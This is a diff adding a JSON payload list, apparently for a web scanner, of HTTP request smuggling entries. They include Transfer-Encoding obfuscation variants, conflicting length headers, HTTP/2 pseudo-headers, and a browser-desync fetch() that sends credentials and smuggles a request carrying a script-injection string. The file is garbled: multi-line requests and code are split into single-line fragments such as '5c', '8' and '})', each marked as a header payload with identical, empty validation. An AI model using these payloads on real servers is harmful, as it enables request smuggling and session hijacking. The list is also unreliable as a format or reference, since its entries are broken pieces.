@@ -1,0 +1,475 @@
+[
+  {
+    "payload_id": "OWP-37468",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "POST / HTTP/1.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37469",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Host: vulnerable-website.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37470",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Content-Length: 13",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37471",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Transfer-Encoding: chunked",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37472",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "SMUGGLED",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37473",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Host: domain.example.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37474",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Connection: keep-alive",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37475",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Content-Type: application/x-www-form-urlencoded",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37476",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Content-Length: 6",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37477",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Content-Length: 3",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37478",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "8",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37479",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37480",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Content-Length: 4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37481",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Connection: close",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37482",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Accept-Encoding: gzip, deflate",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37483",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "5c",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37484",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "GPOST / HTTP/1.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37485",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Content-Length: 15",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37486",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "x=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37487",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Transfer-Encoding: xchunked",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37488",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Transfer-Encoding : chunked",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37489",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Transfer-Encoding: x",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37490",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Transfer-Encoding:[tab]chunked",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37491",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "[space]Transfer-Encoding: chunked",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37492",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X: X[\\n]Transfer-Encoding: chunked",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37493",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Transfer-Encoding",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37494",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": ": chunked",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37495",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": ":method GET",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37496",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": ":path /",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37497",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": ":authority www.example.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37498",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "header ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37499",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Host: www.example.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37500",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Content-Length: 37",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37501",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "GET / HTTP/1.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37502",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "fetch('https://www.example.com/', {method: 'POST', body: \"GET / HTTP/1.1\\r\\nHost: www.example.com\", mode: 'no-cors', credentials: 'include'} )",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37503",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "fetch('https://www.example.com/redirect', {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37504",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "method: 'POST',",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37505",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37506",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "credentials: 'include',",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37507",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "mode: 'cors' // throw an error instead of following redirect",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37508",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "}).catch(() => {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37509",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "location = 'https://www.example.com/'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37510",
+    "vulnerability_category": "Injection (Request Smuggling)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "})",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
